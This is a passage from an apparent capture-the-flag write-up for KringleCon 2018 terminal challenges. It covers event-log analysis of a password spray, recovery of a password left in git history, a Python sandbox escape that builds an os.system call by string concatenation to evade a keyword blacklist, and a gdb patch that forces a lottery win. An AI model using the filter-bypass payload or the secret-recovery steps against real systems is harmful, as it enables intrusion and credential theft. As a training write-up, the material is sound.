<TimeCreated SystemTime="2018-09-10 13:03:33.271959"></TimeCreated>
<EventRecordID>239827</EventRecordID>
<Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="720"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">WIN-KCON-EXCH16$</Data>
<Data Name="SubjectDomainName">EM.KRINGLECON</Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="TargetUserSid">S-1-0-0</Data>
<Data Name="TargetUserName">aaron.smith</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="FailureReason">%%2313</Data>
<Data Name="SubStatus">0xc0000064</Data>
<Data Name="LogonType">8</Data>
<Data Name="LogonProcessName">Advapi  </Data>
<Data Name="AuthenticationPackageName">Negotiate</Data>
<Data Name="WorkstationName">WIN-KCON-EXCH16</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x00000000000019f0</Data>
<Data Name="ProcessName">C:\Windows\System32\inetsrv\w3wp.exe</Data>
<Data Name="IpAddress">172.31.254.101</Data>
<Data Name="IpPort">34049</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4625</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8010000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 13:03:34.075348"></TimeCreated>
<EventRecordID>239830</EventRecordID>
<Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="852"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">WIN-KCON-EXCH16$</Data>
<Data Name="SubjectDomainName">EM.KRINGLECON</Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="TargetUserSid">S-1-0-0</Data>
<Data Name="TargetUserName">abhishek.kumar</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="FailureReason">%%2313</Data>
<Data Name="SubStatus">0xc0000064</Data>
<Data Name="LogonType">8</Data>
<Data Name="LogonProcessName">Advapi  </Data>
<Data Name="AuthenticationPackageName">Negotiate</Data>
<Data Name="WorkstationName">WIN-KCON-EXCH16</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x00000000000019f0</Data>
<Data Name="ProcessName">C:\Windows\System32\inetsrv\w3wp.exe</Data>
<Data Name="IpAddress">172.31.254.101</Data>
<Data Name="IpPort">34397</Data>
</EventData>
</Event>
```

Looking through the list of user's who had failed logins on this IP address shows one event log which sticks out for `minty.candycane`:

```
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4768</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>14339</Task>
<Opcode>0</Opcode>
<Keywords>0x8020000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 13:05:03.398243"></TimeCreated>
<EventRecordID>240168</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="15576"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="TargetUserName">minty.candycane</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="TargetSid">S-1-5-21-25059752-1411454016-2901770228-1156</Data>
<Data Name="ServiceName">krbtgt</Data>
<Data Name="ServiceSid">S-1-5-21-25059752-1411454016-2901770228-502</Data>
<Data Name="TicketOptions">0x40810010</Data>
<Data Name="Status">0x00000000</Data>
<Data Name="TicketEncryptionType">0x00000012</Data>
<Data Name="PreAuthType">2</Data>
<Data Name="IpAddress">::1</Data>
<Data Name="IpPort">0</Data>
<Data Name="CertIssuerName"></Data>
<Data Name="CertSerialNumber"></Data>
<Data Name="CertThumbprint"></Data>
</EventData>
</Event>
```

Put another way, using `grep` to search for all instances of `TargetUserName` and `FailureReason` will show only one user who didn't have a "failure" -- `minty.candycane`. Entering this name in `./runtoanswer` completes the challenge:

```
elf@da627e451ca0:~$ ./runtoanswer 
Loading, please wait......

Whose account was successfully accessed by the attacker's password spray? minty.candycane

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM
MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM
Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M
MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM
MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM
M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM
MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM
MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM
MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM
MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM
MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM
MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM
MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM
MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM
MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM
M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM
MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM
MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM
MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M
MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM
MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations!
```

## Dev Ops Fail

[https://docker.kringlecon.com/?challenge=gitpasshist](https://docker.kringlecon.com/?challenge=gitpasshist)

```
                                                                          
                                                                          
                                   .0.                                    
                               .:llOXKllc.                                
                                 .OXXXK,                                  
                                 '0l'cOc                                  
                                 ..';'..                                  
                               .';::::::'.                                
                            .':::::::::::::,.                             
                         .'::loc::::::::::::::,.                          
                      .'::::oMMNc::::::::::::::::,.                       
                    .,;;,,,,:dxl:::::::,,,:::;,,,,,,.                     
                    .,'  ..;:::::::::::;,;::::,.                          
                      .';::::::::::::::::::::dOxc,.                       
                   .';:::::::::okd::::::::::cXMWd:::,.                    
                .';:::::::::::cNMMo:::::::::::lc:::::::,.                 
             .'::::::::::::::::col::::::::::::;:::::::::::,.              
                   .;:::,,,:::::::::::::::::;,,,:::::'.                   
                .'::::::;;;:::::::::::dko:::::;::::::::;.                 
             .,::::::::::::::::::::::lWMWc::::::::::::::::;.              
            ..:00:...;::::loc:::::::::coc::::::::::::'.;;.....            
              :NNl.,:::::xMMX:::::::::::::::::::::::::;,,.                
               .,::::::::cxxl::::,,,:::::::::::::::::::::;.               
            .,:::::::c:::::::::::;;;:::::::;;:::::kNXd::::::;.            
         .,::::::::cKMNo::::::::::::::::::;,,;::::xKKo:::::::::;.         
       .'''''',:::::x0Oc:::::::::oOOo:::::::::::::::::::::;'''''''.       
            .,:::::::::::::::::::kWWk::::::::::::::ldl:::::;'.            
         .,::;,,::::::::::::::::::::::::::::::::::lMMMl:::::::;'.         
      .,:::::;,;:::::::::::::::::::::::::::::::::::ldl::::::::::::'.      
   .,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'.   
                               ..;;;;;;;;'.                               
                             .';;;;;;;;;;;;'.                             
                          .';;;;;;;;;;;;;;;;;;'.                          
                         ........................                         
                                                                          


Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.

Urging - I scolded, "Don't put creds in git!"
She said, "Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should."

Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our "oops,"
Please find it fast before some other snoops!

Find Sparkle's password, then run the runtoanswer tool.
elf@2aae781c2b40:~$ 
```

The hint for this one was to find the password accidentally committed to git and later removed. Navigating to the repo directory and running `git log` shows one message which hints at a commit made in error. Using this we can checkout the change directly before this commit, find the `config.js` file and then find the password.

```
elf@2aae781c2b40:~$ cd kcconfmgmt/
elf@2aae781c2b40:~/kcconfmgmt$ git log
...

commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use

commit b2376f4a93ca1889ba7d947c2d14be9a5d138802
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 13:25:32 2018 -0500

    Add passport module

...

elf@2aae781c2b40:~/kcconfmgmt$ git checkout b2376f4a93ca1889ba7d947c2d14be9a5d138802
Note: checking out 'b2376f4a93ca1889ba7d947c2d14be9a5d138802'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -b with the checkout command again. Example:

  git checkout -b <new-branch-name>

HEAD is now at b2376f4... Add passport module
elf@2aae781c2b40:~/kcconfmgmt$ find . -name config.js 
./server/config/config.js
elf@2aae781c2b40:~/kcconfmgmt$ cat ./server/config/config.js 
// Database URL
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
elf@2aae781c2b40:~/kcconfmgmt$ 
```

Using this with `./runtoanswer` completes the challenge:

```
elf@2aae781c2b40:~$ ./runtoanswer 
Loading, please wait......



Enter Sparkle Redberry's password: twinkletwinkletwinkle


This ain't "I told you so" time, but it's true:
I shake my head at the goofs we go through.
Everyone knows that the gits aren't the place;
Store your credentials in some safer space.

Congratulations!

elf@2aae781c2b40:~$ 
```

## Python Escape from

[https://docker.kringlecon.com/?challenge=python_docker_challenge](https://docker.kringlecon.com/?challenge=python_docker_challenge)

```
               :lllllllllllllllllllllllllllllllllllllllll,                      
               'lllllllllllllllllllllllllllllllllllllllll:                      
                clllllllllllllllllllllllllllllllllllllllll.                     
                'lllllllllllllllllllllllllllllllllllllllll:                     
                 ;lllllllllllllllllllllllllllllllllllllllll,                    
                  :lllllllllllllllllllllllllllllllllllllllll.                   
                   :lllllllllllllllllllllllllllllllllllllllll.                  
                    ;lllllllllllllllllllllllllllllllllllllllll'                 
                     'lllllllllllllllllllllllllllllllllllllllll;                
                      .cllllllllllllllllllllllllllllllllllllllllc.              
                      .:llllllllllllllllllllllllllllllllllllllllllc,.           
                   .:llllllllllllllllllllllllllllllllllllllllllllllll;.         
                .,cllllllllllllllllllllllllllllllllllllllllllllllllllll,        
              .;llllllllllllllllllllllllllllllllllllllllllllllllllllllllc.      
             ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.     
           'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc     
          :lllllll:..,..'cllllllllllllllllllllllc'.,'.'clllllllllllllllllll;    
        .clllllll'  :XK.  :llllllllllllllllllll;  ,XX.  ;lllllllllllllllllll.   
       .cllllllll.  oXX'  ,llllllllllllllllllll.  cXX;  .lllllllllllllllllll'   
       clllllllll;  .xl  .cllllllllllllllllllllc.  do  .clllllllllllllllllll,   
      :llllllllllll;'..':llllllllllllllllllllllll:'..':lllllllllllllllllllll'   
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.   
     ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc    
     clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.    
     cllllllllllllllllllllllllll..;lc..:llllllllllllllllllllllllllllllllll;     
     :lllllllllllllllllllllllll:  .l,  .lllllllllllllllllllllllllllllllll:      
     ,lllllllllllllllllllllllllc  .l;  ,llllllllllllllllllllllllllllllll:       
     .llllllllllllllllllllllllllc;lll::llllllllllllllllllllllllllllllll,        
      'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.         
       ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,           
        'llllllllllllllllcccccccc;',.,clllllllllllllllllllllllllll,             
         .cllllllc:::::;;,,,,'...':c:;...'',,;;;::::::lllllllllc,               
           'cllllc::;::::cccccccccllc,,,,,,,'',:::::::lllllll;.                 
             .:llllllllllkMMMMMMMMMdlclllllllllollllllllll;.                    
               .':lllllllXMMMMMMMMMoloWMMMMMMMMXllllll:,.                       
                   .,:llccccccccccllllXMMMMMMMMWl:;'.                           
                       .,,,,,,,,,,clll:::::::::;                                
                      'lllllllllc.    ',,,,,,,,.                                
                     lMMMMMMMMMW,    .ddddddddd.                                
                    kMMMMMMMMMX.     kMMMMMMMMK                                 
                   ':::::::::,      .NWWWWWWWW:                                 
                  ',,,,,,,,,.       .,,,,,,,,'                                  
                .oooooooooo.        ',,,,,,,,.                                  
               .NMMMMMMMMW;        cOOOOOOOOx                                   
               0MMMMMMMMMc         NMMMMMMMMk                                   
               ;;;;;;;;;'         .KKKKKKKKK:                                   
              .,,,,,,,,,           ,,,,,,,,,.                                   
              .ddddddddo           ',,,,,,,,.                                   
               XMMMMMMMN           cKKKKKKKKK.                                  
    .;:::;;,,,,,:ldddddd.           0MMMMMMMMX.       ....                      
      .,:ccccccccccccccc            'cccccccccc:::ccccc;.                       
         .:ccccccccccccc            .ccccccccccccccc:'.                         
           .;;;;;;;;;;;;            .ccccccccccccc;.                            
                                    ..............                              
                                                                                
                                                                                


I'm another elf in trouble,
Caught within this Python bubble.

Here I clench my merry elf fist -
Words get filtered by a black list!

Can't remember how I got stuck,
Try it - maybe you'll have more luck?

For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!

-SugarPlum Mary

To complete this challenge, escape Python
and run ./i_escaped
>>> 
```

This challenge drops us into a python shell with restricted terms. Running through [the talk linked to with this challenge](http://www.youtube.com/watch?v=ZVx2Sxl3B9c) guides us to the answer:

```
>>> restricted_terms
['import', 'pty', 'open', 'exec', 'compile', 'os.system', 'subprocess.', 'reload', '__builtins__', '__class__', '__mro__']
>>> eval('__imp'+'ort__("os")').system("./i_escaped")
Loading, please wait......


 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary
            
You escaped! Congratulations!

0
>>> 
```

## The Sleighbell

[https://docker.kringlecon.com/?challenge=unlinked-function](https://docker.kringlecon.com/?challenge=unlinked-function)

```
                                                                                
                                                                                
                                                                                
                              WKOdl:;oW                                         
                          WOo:'.......cW         X0KXW                          
                kdxOX     x...;.....;c.d      Xd;....':d0W                      
               W,....'cd0WN,.,WNd'...d:'N   Xl........',.:W                     
                l........':odoK  No..,0.k Wx';.....'lOWX.'N                     
                O............,oK   O..O;dWl,d'...;xN   x.o         NXKKKKXN     
                W,.....,:ccc:,..;kW k.dcdd,k'..,kW    0'cW    Xko:'.....:odOKW  
                 d........',;clll:,xWlolx'x;..oN    Wx'lW  Ko;..........,cxK    
                 N,..,codxkkkxdl:::;:xKlx,k.'O     O;,O Ko,....;cdk0KXXXXK0kOW  
                  K,.OW           Xkl':k0:o.O   Wk;:kNk:..'cd0N                 
 W0kdlc:::cloxk0XW Wkc;lx0KNWW       NxlKOxd WOl:dK0l''cdOKK0OOOO0KXNW          
  W  NOo'.........,:oxOkkxlc;,',,,,,,:dK;.dKllx0Oo,;d0XKO0KKXKKKK0OO0KXKKN      
  NOxodkO00KKK0OOkdoc:,'.,:ldxxxxxdddolx;;xdlcc::cx;0K0KKXXXXXX00KK00OOO0K      
             WNXK00000KKKK0kxoodl::::ox,.xlK0kdlccdKOOKXXXK000KKKOOOO00000W     
           X0O0000KXX00000KNK;o;...:0 d,,;lNW      0O0XXK0O0KK0OO0KKK000000     
       NXNK000O0KKKKKXKKXK000kl:cdK WXK0000000KKKNW00KK0O0K0OO0KKK00XXXXK0OW    
      WOOOOOO000000OO0KKKKXXOON  WX0OOO0XXXXXXXKOOOKK0O0K0OOOKK0O0XXXXXXK0OW    
       N000000OOOOO0000OO0XXXX0WXOOKXXXXXXXXXXXKKXX0O0XKOO0K0OOKXXXXXXKX0O0     
       KOKXKOO00000OOOO0KK0OOOK0OOX00KX0KKKKKKK00XXXXOOX0KKO0XXXXXXXXXOO0KW     
       0OKXXKKKKKK000K0OOO0KKKKOO0KKKKK0000000KKKKKK00OONO0XKO0NNXKKXXXXN       
       XOO0KXKO0KKKKKOO0K0O0KXK0KXKKKKKKKK000KKKKKKKKK0KKKK0OOONWXK00OKN        
        0OOW WOOKXXXXKKKK0KNOOOOOKKXXKKKKKKKKKKKKXXKK0OOOOKX00OOO0KXNW          
         KOO0NKOKXXXXXXXX0O0KXKKKKKK000000000000000KKKKKKNW                     
          WKOOXNKKKKKKKKK0OKW KO0XXKKKKKKKXXXXXXXXXXXKOON                       
             NXKNNKOOO00XN    W00KK000K000KXXXXXXXXXKK0X                        
                   WW          WKOOO0   KOKKKXXXXXX0OON                         
                                 NKOO0KKNNXKOOOXXOO0XW                          
                                   WNK0OOO0KXXNNXXN                             
                                        WWWWWW                                  
                                                                                

I'll hear the bells on Christmas Day
Their sweet, familiar sound will play
  But just one elf,
  Pulls off the shelf,
The bells to hang on Santa's sleigh!

Please call me Shinny Upatree
I write you now, 'cause I would be
  The one who gets -
  Whom Santa lets
The bells to hang on Santa's sleigh!

But all us elves do want the job,
Conveying bells through wint'ry mob
  To be the one
  Toy making's done
The bells to hang on Santa's sleigh!

To make it fair, the Man devised
A fair and simple compromise.
  A random chance,
  The winner dance!
The bells to hang on Santa's sleigh!

Now here I need your hacker skill.
To be the one would be a thrill!
  Please do your best,
  And rig this test
The bells to hang on Santa's sleigh!

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.
elf@81ac32c6b430:~$ 
```

This last challenge prompts you to use `gdb` to debug a program and bypass the randomness associated with the program. First, running `objdump` shows us that the `main` function is rather straightforward:

```
elf@81ac32c6b430:~$ objdump -d ./sleighbell-lotto 
...

00000000000014ca <main>:
    14ca:       55                      push   %rbp
    14cb:       48 89 e5                mov    %rsp,%rbp
    14ce:       48 83 ec 10             sub    $0x10,%rsp
    14d2:       48 8d 3d d6 56 00 00    lea    0x56d6(%rip),%rdi        # 6baf <_IO_stdin_used+0x557f>
    14d9:       e8 92 f4 ff ff          callq  970 <getenv@plt>
    14de:       48 85 c0                test   %rax,%rax
    14e1:       75 16                   jne    14f9 <main+0x2f>
    14e3:       48 8d 3d d6 56 00 00    lea    0x56d6(%rip),%rdi        # 6bc0 <_IO_stdin_used+0x5590>
    14ea:       e8 21 f4 ff ff          callq  910 <puts@plt>
    14ef:       bf ff ff ff ff          mov    $0xffffffff,%edi
    14f4:       e8 27 f4 ff ff          callq  920 <exit@plt>
    14f9:       bf 00 00 00 00          mov    $0x0,%edi
    14fe:       e8 dd f4 ff ff          callq  9e0 <time@plt>
    1503:       89 c7                   mov    %eax,%edi
    1505:       e8 96 f4 ff ff          callq  9a0 <srand@plt>
    150a:       48 8d 3d 3f 58 00 00    lea    0x583f(%rip),%rdi        # 6d50 <_IO_stdin_used+0x5720>
    1511:       e8 fa f3 ff ff          callq  910 <puts@plt>
    1516:       bf 01 00 00 00          mov    $0x1,%edi
    151b:       e8 40 f4 ff ff          callq  960 <sleep@plt>
    1520:       e8 9b f4 ff ff          callq  9c0 <rand@plt>
    1525:       89 c1                   mov    %eax,%ecx
    1527:       ba ad 8b db 68          mov    $0x68db8bad,%edx
    152c:       89 c8                   mov    %ecx,%eax
    152e:       f7 ea                   imul   %edx
    1530:       c1 fa 0c                sar    $0xc,%edx
    1533:       89 c8                   mov    %ecx,%eax
    1535:       c1 f8 1f                sar    $0x1f,%eax
    1538:       29 c2                   sub    %eax,%edx
    153a:       89 d0                   mov    %edx,%eax
    153c:       89 45 fc                mov    %eax,-0x4(%rbp)
    153f:       8b 45 fc                mov    -0x4(%rbp),%eax
    1542:       69 c0 10 27 00 00       imul   $0x2710,%eax,%eax
    1548:       29 c1                   sub    %eax,%ecx
    154a:       89 c8                   mov    %ecx,%eax
    154c:       89 45 fc                mov    %eax,-0x4(%rbp)
    154f:       48 8d 3d 56 58 00 00    lea    0x5856(%rip),%rdi        # 6dac <_IO_stdin_used+0x577c>
    1556:       b8 00 00 00 00          mov    $0x0,%eax
    155b:       e8 90 f3 ff ff          callq  8f0 <printf@plt>
    1560:       8b 45 fc                mov    -0x4(%rbp),%eax
    1563:       89 c6                   mov    %eax,%esi
    1565:       48 8d 3d 58 58 00 00    lea    0x5858(%rip),%rdi        # 6dc4 <_IO_stdin_used+0x5794>
    156c:       b8 00 00 00 00          mov    $0x0,%eax
    1571:       e8 7a f3 ff ff          callq  8f0 <printf@plt>
    1576:       48 8d 3d 4a 58 00 00    lea    0x584a(%rip),%rdi        # 6dc7 <_IO_stdin_used+0x5797>
    157d:       e8 8e f3 ff ff          callq  910 <puts@plt>
    1582:       81 7d fc c9 04 00 00    cmpl   $0x4c9,-0x4(%rbp)
    1589:       75 0c                   jne    1597 <main+0xcd>
    158b:       b8 00 00 00 00          mov    $0x0,%eax
    1590:       e8 42 fa ff ff          callq  fd7 <winnerwinner>
    1595:       eb 0a                   jmp    15a1 <main+0xd7>
    1597:       b8 00 00 00 00          mov    $0x0,%eax
    159c:       e8 16 ff ff ff          callq  14b7 <sorry>
    15a1:       bf 00 00 00 00          mov    $0x0,%edi
    15a6:       e8 75 f3 ff ff          callq  920 <exit@plt>
    15ab:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
...
```

We can see that by line `154c`, the function has called `rand()`, done some arithmetic, and is storing the variable off for later use. If we set a breakpoint at this address and change a variable then this should give us the answer. Using `gdb` this is straightforward as shown below:

```
elf@81ac32c6b430:~$ gdb ./sleighbell-lotto 
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.
(gdb) break *0x000055555555554c
Breakpoint 1 at 0x55555555554c
(gdb) r
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...


Breakpoint 1, 0x000055555555554c in main ()
(gdb) set $rax = 1225
(gdb) c
Continuing.
You drew ticket number 1225!


                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 25) exited normally]
(gdb) 
``` 
